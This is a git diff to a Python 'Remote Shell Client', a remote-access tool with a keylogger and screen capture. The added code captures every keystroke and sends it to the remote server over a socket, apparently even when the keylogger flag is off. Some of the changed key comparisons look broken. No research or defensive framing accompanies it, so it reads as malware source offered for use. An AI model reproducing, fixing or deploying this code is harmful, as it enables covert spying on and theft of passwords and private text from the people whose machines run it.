@@ -1,8 +1,11 @@
 #!/usr/bin/python
 # Remote Shell Client
+
 # Description:
 # This script serves as the client-side counterpart to the Remote Shell server. It connects to the server
 # and allows the execution of commands, file operations, and includes a keylogger feature.
+
+
 import io
 import socket
 import threading
@@ -12,7 +15,7 @@ import subprocess
 import os
 import platform
 from PIL import ImageGrab
-from pynput import keyboard
+from pynput.keyboard import Listener
 
 
 class RemoteControl:
@@ -41,6 +44,32 @@ class RemoteControl:
                 time.sleep(10)
 
     def capture_keys(self, key):
+        try:
+            # [*] check 'vk': 65437 bug
+            # key_attributes = dir(key)
+            # for attributes in key_attributes:
+            #     if not callable(getattr(key, attributes)):
+            #         pr = getattr(key, attributes)
+            #         if isinstance(pr, dict):
+            #             print("\n", pr)
+            if key == 'space':
+                char = " "
+            elif key == 'enter':
+                char = "\n"
+            elif key == 'backspace':
+                char = "<- "
+            elif hasattr(key, 'char'):
+                char = key.char
+                # There's a bug when pressing numpy 5 on linux systems
+                # {'vk': 65437, 'char': None, 'is_dead': False, 'combining': None, '_symbol': None}
+                if key.vk == 65437:
+                    char = "5"
+            else:
+                char = getattr(key, 'char')
+            print(char, end='', flush=True)
+            self.server_socket.send(char.encode())
+        except Exception as e_cap_key:
+            print(f"\ndef [capture_keys] Error:\n{e_cap_key}")
         if self.keylogger_active:
             try:
                 # [*] check 'vk': 65437 bug
@@ -50,11 +79,11 @@ class RemoteControl:
                 #         pr = getattr(key, attributes)
                 #         if isinstance(pr, dict):
                 #             print("\n", pr)
-                if key == keyboard.Key.space:
+                if key == key.space:
                     char = " "
-                elif key == keyboard.Key.enter:
+                elif key == key.enter:
                     char = "\n"
-                elif key == keyboard.Key.backspace:
+                elif key == key.backspace:
                     char = "<- "
                 elif hasattr(key, 'char'):
                     char = key.char
@@ -229,7 +258,7 @@ if __name__ == "__main__":
 
             if server.active_keylogger_listener:
                 while server.keylogger_active:
-                    listener = keyboard.Listener(on_press=server.capture_keys)
+                    listener = Listener(on_press=server.capture_keys)
                     listener.start()
                     server.active_keylogger_listener = False
                     break
